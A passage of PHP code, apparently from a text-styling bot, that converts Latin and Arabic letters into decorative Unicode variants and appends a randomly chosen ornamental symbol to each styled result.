$ok = str_replace("g","𝗚",$ok);
$ok = str_replace("h","𝗛",$ok);
$ok = str_replace("i","𝗜",$ok);
$ok = str_replace("j","𝗝",$ok);
$ok = str_replace("k","𝗞",$ok);
$ok = str_replace("l","𝗟",$ok);
$ok = str_replace("m","𝗠",$ok);
$ok = str_replace("n","𝗡",$ok);
$ok = str_replace("o","𝗢",$ok);
$ok = str_replace("p","𝗣",$ok);
$ok = str_replace("q","𝗤",$ok);
$ok = str_replace("r","𝗥",$ok);
$ok = str_replace("s","𝗦",$ok);
$ok = str_replace("t","𝗧",$ok);
$ok = str_replace("u","𝗨",$ok);
$ok = str_replace("v","𝗩",$ok);
$ok = str_replace("w","𝗪",$ok);
$ok = str_replace("x","𝗫",$ok);
$ok = str_replace("y","𝗬",$ok);
$ok = str_replace("z","𝗭",$ok);
$ok = str_replace('ض','ضـ',$ok); 
$ok = str_replace('ض','ضــً',$ok); 
$ok = str_replace('ص','صـــ͒͜ـً',$ok); 
$ok = str_replace('ث','ثــہ',$ok); 
$ok = str_replace('ق','ق',$ok); 
$ok = str_replace('ف','ف',$ok); 
$ok = str_replace('غ','غــ۫͜ـ',$ok); 
$ok = str_replace('ع','عــُ',$ok); 
$ok = str_replace('ه','هہ',$ok); 
$ok = str_replace('خ','خــ۫͜ـ',$ok); 
$ok = str_replace('ح','حــ۫͜ـ',$ok); 
$ok = str_replace('ج','جـ',$ok); 
$ok = str_replace('ش','شـٰཻــ',$ok); 
$ok = str_replace('س','ســ',$ok); 
$ok = str_replace('ي','ي',$ok); 
$ok = str_replace('ب','بـ',$ok);
$ok = str_replace('ل','لـ',$ok); 
$ok = str_replace('ا','آ',$ok); 
$ok = str_replace('ت','تـٰཻــ',$ok); 
$ok = str_replace('ن','ن',$ok); 
$ok = str_replace('ك','ڪ',$ok); 
$ok = str_replace('م','مـٰ',$ok); 
$ok = str_replace('ة','ةً',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظً',$ok); 
$ok = str_replace('ط','طُ',$ok); 
 $ok = str_replace('ذ','ذً',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زً',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','ﻭ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
$h = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a','𝐚',$text);
$ok = str_replace("b","𝐛",$ok);
$ok = str_replace("c","𝐜",$ok);
$ok = str_replace("d","𝐝",$ok);
$ok = str_replace("e","𝐞",$ok);
$ok = str_replace("E","𝐟",$ok);
$ok = str_replace("g","𝐠",$ok);
$ok = str_replace("h","𝐡",$ok);
$ok = str_replace("i","𝐢",$ok);
$ok = str_replace("j","𝐣",$ok);
$ok = str_replace("k","𝐤",$ok);
$ok = str_replace("l","𝐥",$ok);
$ok = str_replace("m","𝐦",$ok);
$ok = str_replace("n","𝐧",$ok);
$ok = str_replace("o","𝐨",$ok);
$ok = str_replace("p","𝐩",$ok);
$ok = str_replace("q","𝐪",$ok);
$ok = str_replace("r","𝐫",$ok);
$ok = str_replace("s","𝐬",$ok);
$ok = str_replace("t","𝐭",$ok);
$ok = str_replace("u","𝐮",$ok);
$ok = str_replace("v","𝐯",$ok);
$ok = str_replace("w","𝐰",$ok);
$ok = str_replace("x","𝐱",$ok);
$ok = str_replace("y","𝐲",$ok);
$ok = str_replace("z","𝐳",$ok);
$ok = str_replace('ض','ضــٰـُ͢ـًُ',$ok); 
$ok = str_replace('ص','صـ͒͜ـً',$ok); 
$ok = str_replace('ث','ثـَٰـَٰـ',$ok); 
$ok = str_replace('ق','قٰཻ͚͆ــ͒͜ـً',$ok); 
$ok = str_replace('ف','فــ͡ـ',$ok); 
$ok = str_replace('غ','غــ̷ِْــٰ',$ok); 
$ok = str_replace('ع','عـ๋๋͜͜͡‏ـۂ',$ok); 
$ok = str_replace('هہ','ه',$ok); 
$ok = str_replace('خ','خــ۫͜ـ',$ok); 
$ok = str_replace('ح','حــ۫͜ـ',$ok); 
$ok = str_replace('ج','جـ',$ok); 
$ok = str_replace('ش','شـٰـُ͢ـُٰཻـ',$ok); 
$ok = str_replace('س','سـٰٰٰٖٖٖۧـ๋͜ــ',$ok); 
$ok = str_replace('ي','ي',$ok); 
$ok = str_replace('ب','بـ',$ok);
$ok = str_replace('ل','ݪ',$ok); 
$ok = str_replace('ٰٖۧـৡ๋͜ت','تـ',$ok); 
$ok = str_replace('ن','ن',$ok); 
$ok = str_replace('ك','ڪ',$ok); 
$ok = str_replace('م','مـٰ',$ok); 
$ok = str_replace('ة','ةً',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظـَٰـًَٰ',$ok); 
$ok = str_replace('ط','طُ',$ok); 
 $ok = str_replace('ذ','ذً',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زً',$ok); 
$ok = str_replace('ر','ࢪ',$ok); 
$ok = str_replace('و','وُ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
 $i = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a','𝑎',$text);
$ok = str_replace("b","𝑏",$ok);
$ok = str_replace("c","𝑐",$ok);
$ok = str_replace("d","𝑑",$ok);
$ok = str_replace("e","𝑒",$ok);
$ok = str_replace("E","𝑓",$ok);
$ok = str_replace("g","𝑔",$ok);
$ok = str_replace("h","ℎ",$ok);
$ok = str_replace("i","𝑖",$ok);
$ok = str_replace("j","𝑗",$ok);
$ok = str_replace("k","𝑘",$ok);
$ok = str_replace("l","𝑙",$ok);
$ok = str_replace("m","𝑚",$ok);
$ok = str_replace("n","𝑛",$ok);
$ok = str_replace("o","𝑜",$ok);
$ok = str_replace("p","𝑝",$ok);
$ok = str_replace("q","𝑞",$ok);
$ok = str_replace("r","𝑟",$ok);
$ok = str_replace("s","𝑠",$ok);
$ok = str_replace("t","𝑡",$ok);
$ok = str_replace("u","𝑢",$ok);
$ok = str_replace("v","𝑣",$ok);
$ok = str_replace("w","𝑤",$ok);
$ok = str_replace("x","𝑥",$ok);
$ok = str_replace("y","𝑦",$ok);
$ok = str_replace("z","𝑧",$ok);
$ok = str_replace('ض','ض',$ok); 
$ok = str_replace('ص','صـٰـَہ',$ok); 
$ok = str_replace('ق','قـٰـَہ',$ok); 
$ok = str_replace('ف','فـٰـَہ',$ok); 
$ok = str_replace('غ','غ',$ok); 
$ok = str_replace('ع','ع',$ok); 
$ok = str_replace('ه','هہ',$ok); 
$ok = str_replace('خ','خـٰـَہ',$ok); 
$ok = str_replace('ح','حـٰـَہ',$ok); 
$ok = str_replace('ج','ج',$ok); 
$ok = str_replace('ش','شـٰـَہ',$ok); 
$ok = str_replace('س','سـٰـَہ',$ok); 
$ok = str_replace('ي','يـٰـَہ',$ok); 
$ok = str_replace('ب','بـٰـَہ',$ok); 
$ok = str_replace('ل','لـٰـَہ',$ok); 
$ok = str_replace('ا','ا',$ok); 
$ok = str_replace('ت','تـٰـَہ',$ok); 
$ok = str_replace('ن','ن',$ok); 
$ok = str_replace('م','مـٰـَہ',$ok); 
$ok = str_replace('ك','كـٰـَہ',$ok); 
$ok = str_replace('ظ','ظ',$ok); 
$ok = str_replace('ط','ط',$ok); 
$ok = str_replace('ذ','ذ',$ok); 
$ok = str_replace('د','د',$ok); 
$ok = str_replace('ز','ز',$ok); 
$ok = str_replace('ر','ر',$ok); 
$ok = str_replace('͟໑໑','و',$ok); 
$ok = str_replace('ث',' ث',$ok); 
$ok = str_replace('ة','ة',$ok); 
$ok = str_replace('ى','ى',$ok); 
$ok = str_replace('ء','ء',$ok); 
$j = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a','ᥲ️',$text);
$ok = str_replace("b","Ⴆ",$ok);
$ok = str_replace("c","ᥴ",$ok);
$ok = str_replace("d","ძ",$ok);
$ok = str_replace("e","ᥱ",$ok);
$ok = str_replace("E","ƒ",$ok);
$ok = str_replace("g","ᧁ",$ok);
$ok = str_replace("h","Ꮒ",$ok);
$ok = str_replace("i","Ꭵ",$ok);
$ok = str_replace("j","᧒",$ok);
$ok = str_replace("k","𝚔",$ok);
$ok = str_replace("l","ᥣ",$ok);
$ok = str_replace("m","꧑",$ok);
$ok = str_replace("n","ꪀ",$ok);
$ok = str_replace("o","᥆",$ok);
$ok = str_replace("p","ρ",$ok);
$ok = str_replace("q","ǫ",$ok);
$ok = str_replace("r","ℛ",$ok);
$ok = str_replace("s","᥉",$ok);
$ok = str_replace("t","ƚ",$ok);
$ok = str_replace("u","ᥙ",$ok);
$ok = str_replace("v","᥎",$ok);
$ok = str_replace("w","ꪝ",$ok);
$ok = str_replace("x","᥊",$ok);
$ok = str_replace("y","ꪗ",$ok);
$ok = str_replace("z","ᤁ",$ok);
$ok = str_replace('ض','ضــٰཻــ ',$ok); 
$ok = str_replace('ص','صــًـًًًًٍٍـًٍـًًٍ',$ok); 
$ok = str_replace('ث','ث',$ok); 
$ok = str_replace('ق','قـﮧ̯͡ــ̷ـــ',$ok); 
$ok = str_replace('ف','فـﮧ̯͡ــ̷ـــ',$ok); 
$ok = str_replace('غ','غـٰཻـــًـًًٍـًٍـًًٍ',$ok); 
$ok = str_replace('ع','ع',$ok); 
$ok = str_replace('ه','ههہ',$ok); 
$ok = str_replace('خ','خــ ',$ok); 
$ok = str_replace('ح','حٰཻ͚͆ـــــ͒͜ــًـًًًًٍٍـًٍـًًٍ',$ok); 
$ok = str_replace('ج','جـ',$ok); 
$ok = str_replace('ش','شــ͒͜ـًﮧ̯͡ــ̷ــــ',$ok); 
$ok = str_replace('س','سـٰٰٰٖٖٖۧـ๋͜ــًـًًًًٍٍـًٍـًًٍـــ',$ok); 
$ok = str_replace('ي','ي',$ok); 
$ok = str_replace('ب','بــٰٰٰ๋ٖٖٖۧ͜ــ۫͜ــــ',$ok);
$ok = str_replace('ل','ݪ',$ok); 
$ok = str_replace('ا','آ',$ok); 
$ok = str_replace('تٰཻ͚͆','تـَٰﮧ̯͡ــ̷ـــ',$ok); 
$ok = str_replace('ن','ن',$ok); 
$ok = str_replace('م','م',$ok); 
$ok = str_replace('ك','ڪ',$ok); 
$ok = str_replace('ة','ةً',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظــٰـُ͢ـًُــ',$ok); 
$ok = str_replace('ط','طــ',$ok); 
 $ok = str_replace('ذ','ذِ',$ok); 
$ok = str_replace('د','دٰ',$ok); 
$ok = str_replace('ز','زً',$ok); 
$ok = str_replace('ر','ر',$ok); 
$ok = str_replace('ཻ͟و','و',$ok); 
 $ok = str_replace('ى','ىٰ',$ok);
$k = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','ᴬ',$text);
$ok = str_replace("b","ᴮ",$ok);
$ok = str_replace("c","ᶜ",$ok);
$ok = str_replace("d","ᴰ",$ok);
$ok = str_replace("e","ᴱ",$ok);
$ok = str_replace("f","ᶠ",$ok);
$ok = str_replace("g","ᴳ",$ok);
$ok = str_replace("h","ᴴ",$ok);
$ok = str_replace("i","ᴵ",$ok);
$ok = str_replace("j","ᴶ",$ok);
$ok = str_replace("k","ᴷ",$ok);
$ok = str_replace("l","ᴸ",$ok);
$ok = str_replace("m","ᴹ",$ok);
$ok = str_replace("n","ᴺ",$ok);
$ok = str_replace("o","ᴼ",$ok);
$ok = str_replace("p","ᴾ",$ok);
$ok = str_replace("q","ᵟ",$ok);
$ok = str_replace("r","ᴿ",$ok);
$ok = str_replace("s","ˢ",$ok);
$ok = str_replace("t","ᵀ",$ok);
$ok = str_replace("u","ᵁ",$ok);
$ok = str_replace("v","ᵛ",$ok);
$ok = str_replace("w","ᵂ",$ok);
$ok = str_replace("x","ˣ",$ok);
$ok = str_replace("y","ᵞ",$ok);
$ok = str_replace("z","ᶻ",$ok);
$l = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝗮',$text);
$ok = str_replace("b","𝗯",$ok);
$ok = str_replace("c","𝗰",$ok);
$ok = str_replace("d","𝗱",$ok);
$ok = str_replace("e","𝗲",$ok);
$ok = str_replace("f","𝗳",$ok);
$ok = str_replace("g","𝗴",$ok);
$ok = str_replace("h","𝗵",$ok);
$ok = str_replace("i","𝗶",$ok);
$ok = str_replace("j","𝗴",$ok);
$ok = str_replace("k","𝗸",$ok);
$ok = str_replace("l","𝗹",$ok);
$ok = str_replace("m","𝗺",$ok);
$ok = str_replace("n","𝗻",$ok);
$ok = str_replace("o","𝗼",$ok);
$ok = str_replace("p","𝗽",$ok);
$ok = str_replace("q","𝗾",$ok);
$ok = str_replace("r","𝗿",$ok);
$ok = str_replace("s","𝘀",$ok);
$ok = str_replace("t","𝘁",$ok);
$ok = str_replace("u","𝘂",$ok);
$ok = str_replace("v","𝘃",$ok);
$ok = str_replace("w","𝘄",$ok);
$ok = str_replace("x","𝘅",$ok);
$ok = str_replace("y","𝘆",$ok);
$ok = str_replace("z","𝘇",$ok);
$ok = str_replace('ض','ضّ',$ok);
$ok = str_replace('ص','صٌ',$ok); 
$ok = str_replace('ث','ثّ',$ok); 
$ok = str_replace('ق','قِ',$ok); 
$ok = str_replace('ف','فِّ',$ok); 
$ok = str_replace('غ','غٌ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','هِ',$ok); 
$ok = str_replace('خ','خَ',$ok); 
$ok = str_replace('ح','حٌ',$ok); 
$ok = str_replace('ج','جِ',$ok); 
$ok = str_replace('ش','شٍ',$ok); 
$ok = str_replace('س',' س',$ok); 
$ok = str_replace('ي','يِّ',$ok); 
$ok = str_replace('ب','بِ',$ok);
$ok = str_replace('ل','لَ',$ok); 
$ok = str_replace('ا','أّ',$ok); 
$ok = str_replace('ت','تّ',$ok); 
$ok = str_replace('ن','نِ',$ok); 
$ok = str_replace('ك','ګ',$ok); 
$ok = str_replace('م','مَ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظّ',$ok); 
$ok = str_replace('ط','طّ',$ok); 
 $ok = str_replace('ذ','ذّ',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زِّ',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','وِ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
$m = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text);
$ok = str_replace('a','𝕬',$text);
$ok = str_replace("b","𝕭",$ok);
$ok = str_replace("c","𝕮",$ok);
$ok = str_replace("d","𝕯",$ok);
$ok = str_replace("e","𝕰",$ok);
$ok = str_replace("E","𝕱",$ok);
$ok = str_replace("g","𝕲",$ok);
$ok = str_replace("h","𝕳",$ok);
$ok = str_replace("i","𝕴",$ok);
$ok = str_replace("j","𝕵",$ok);
$ok = str_replace("k","𝕶",$ok);
$ok = str_replace("l","𝕷",$ok);
$ok = str_replace("m","𝕸",$ok);
$ok = str_replace("n","𝕹",$ok);
$ok = str_replace("o","𝕺",$ok);
$ok = str_replace("p","𝕻",$ok);
$ok = str_replace("q","𝕼",$ok);
$ok = str_replace("r","𝕽",$ok);
$ok = str_replace("s","𝕾",$ok);
$ok = str_replace("t","𝕿",$ok);
$ok = str_replace("u","𝖀",$ok);
$ok = str_replace("v","𝖁",$ok);
$ok = str_replace("w","𝖂",$ok);
$ok = str_replace("x","𝖃",$ok);
$ok = str_replace("y","𝖄",$ok);
$ok = str_replace("z","𝖅",$ok);
$ok = str_replace('ض','ضّ',$ok);
$ok = str_replace('ص','صٌ',$ok); 
$ok = str_replace('ث','ثّ',$ok); 
$ok = str_replace('ق','قᮭ',$ok); 
$ok = str_replace('ف','ف᭫ᮥ',$ok); 
$ok = str_replace('غ','غٌ',$ok); 
$ok = str_replace('ع','عٌ',$ok); 
$ok = str_replace('ه','هِ',$ok); 
$ok = str_replace('خ','خ᪳᪲',$ok); 
$ok = str_replace('ح','ح᪽',$ok); 
$ok = str_replace('ج','ج᪷᪹',$ok); 
$ok = str_replace('ش','شٍ',$ok); 
$ok = str_replace('س',' َّس',$ok); 
$ok = str_replace('ي','ي᪸᪰',$ok); 
$ok = str_replace('ب','بᤠ',$ok);
$ok = str_replace('ل','لཻ',$ok); 
$ok = str_replace('ا','اི',$ok); 
$ok = str_replace('ت','تّ',$ok); 
$ok = str_replace('ن','ن྄༹',$ok); 
$ok = str_replace('ك','كิ',$ok); 
$ok = str_replace('م','مຼ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظܱܰ',$ok); 
$ok = str_replace('ط','ط์',$ok); 
 $ok = str_replace('ذ','ذٍُ',$ok); 
$ok = str_replace('د','دّ',$ok); 
$ok = str_replace('ز','زٌِ',$ok); 
$ok = str_replace('ر','رٰ',$ok); 
$ok = str_replace('و','وٰ໑ٰ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
$n = $ok.''.$smile;
 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a', 'Ａ', $text);
$ok = str_replace('b', 'Ｂ', $ok);
$ok = str_replace('c', 'Ｃ', $ok);
$ok = str_replace('d', 'Ｄ', $ok);
$ok = str_replace('e', 'Ｅ', $ok);
$ok = str_replace('f', 'Ｆ', $ok);
$ok = str_replace('g', 'Ｇ', $ok);
$ok = str_replace('h', 'Ｈ', $ok);
$ok = str_replace('i', 'Ｉ', $ok);
$ok = str_replace('j', 'Ｊ', $ok);
$ok = str_replace('k', 'Ｋ', $ok);
$ok = str_replace('l', 'Ｌ', $ok);
$ok = str_replace('m', 'Ｍ', $ok);
$ok = str_replace('n', 'Ｎ', $ok);
$ok = str_replace('o', 'Ｏ', $ok);
$ok = str_replace('p', 'Ｐ', $ok);
$ok = str_replace('q', 'Ｑ', $ok);
$ok = str_replace('r', 'Ｒ', $ok);
$ok = str_replace('s', 'Ｓ', $ok);
$ok = str_replace('t', 'Ｔ', $ok);
$ok = str_replace('u', 'Ｕ', $ok);
$ok = str_replace('v', 'Ｖ', $ok);
$ok = str_replace('w', 'Ｗ', $ok);
$ok = str_replace('x', 'Ｘ', $ok);
$ok = str_replace('y', 'Ｙ', $ok);
$ok = str_replace('z', 'Ｚ', $ok);
$ok = str_replace('ض','ضُ',$ok);
$ok = str_replace('ص','صّ',$ok); 
$ok = str_replace('ث','ثُ',$ok); 
$ok = str_replace('ق','قً',$ok); 
$ok = str_replace('ف','فَ',$ok); 
$ok = str_replace('غ','غً',$ok); 
$ok = str_replace('ع','ْع ',$ok); 
$ok = str_replace('ه','هہ',$ok); 
$ok = str_replace('خ','خہ',$ok); 
$ok = str_replace('ح','حہ',$ok); 
$ok = str_replace('ج','جہ',$ok); 
$ok = str_replace('ش','شہ',$ok); 
$ok = str_replace('س',' سہ',$ok); 
$ok = str_replace('ي','يہ',$ok); 
$ok = str_replace('ب','بہ',$ok);
$ok = str_replace('ل','لَ',$ok); 
$ok = str_replace('ا','آ',$ok); 
$ok = str_replace('ت','تہ',$ok); 
$ok = str_replace('ن','نہ',$ok); 
$ok = str_replace('ك','كہ',$ok); 
$ok = str_replace('م','مہ',$ok); 
$ok = str_replace('ة',' ةّ',$ok); 
$ok = str_replace('ء','ء',$ok); 
$ok = str_replace('ظ','ظہ',$ok); 
$ok = str_replace('ط','طہ',$ok); 
 $ok = str_replace('ذ','ذّ',$ok); 
$ok = str_replace('د','دِ',$ok); 
$ok = str_replace('ز','زِّ',$ok); 
$ok = str_replace('ر','ڒٍ',$ok); 
$ok = str_replace('و','وِ',$ok); 
$ok = str_replace('ى','ىّ',$ok);
 $o = ''.''.$ok.''.$smile.'';

 $items = ['🇸🇾','﷼','ﷻ','﷽','✞','ッ','ッ','彡','Ω','۞','۩','✟','『','','』۝','Ξ','道','凸','父','个','¤','品','〠','๛','𖤍','ᶠᶸᶜᵏᵧₒᵤ','࿐','⍆','⍅','⇭','༒','','','𖠃','𖠅','𖠆','𖠊','𖡒','𖡗','𖣩','꧁','꧂','','〰','𖥓','𖥏','𖥎','𖥌','𖥋','𖥊','𖥈','𖥅','𖥃','𖥂','𖥀','𖤼','𖤹','𖤸','𖤷','𖤶','𖤭','𖤫','𖤪','𖤨','𖤧','𖤥','𖤤','𖤣','𖤢','𖤡','𖤟','𖤞','𖤝','𖤜','𖤛','𖤚','𖤘','𖤙','𖤗','𖤕','𖤓','𖤒','𖤐','ဏ','࿘','࿗','࿖','࿕','࿑','࿌','࿋','࿊','࿉','࿈','࿇','࿅','࿄','࿃','࿂','༼','༽','༺','༻','༗','༖','༕','⏝','⏜','⏎','၄','߷','ܛ','׀
𖠀','𖠁','𖠂','𖠅','𖠆','𖠇','𖠈','𖠉','𖠍','𖠎','𖠏','𖠐','𖠑','𖠒','𖠓','𖠔','𖠕','𖠖'];
$_smile = array_rand($items,1);
$smile = $items[$_smile];
$count = count($text); 
$ok = str_replace('a', 'Ȃ̈', $text);
$ok = str_replace('b', 'B̑̈', $ok);
$ok = str_replace('c', 'C̑̈', $ok);
$ok = str_replace('d', 'D̑̈', $ok);
$ok = str_replace('e', 'Ȇ̈', $ok);
$ok = str_replace('f', 'F̑̈', $ok);
$ok = str_replace('g', 'G̑̈', $ok);
$ok = str_replace('h', 'H̑̈', $ok);
$ok = str_replace('i', 'Ȋ̈', $ok);
$ok = str_replace('j', 'J̑̈', $ok);
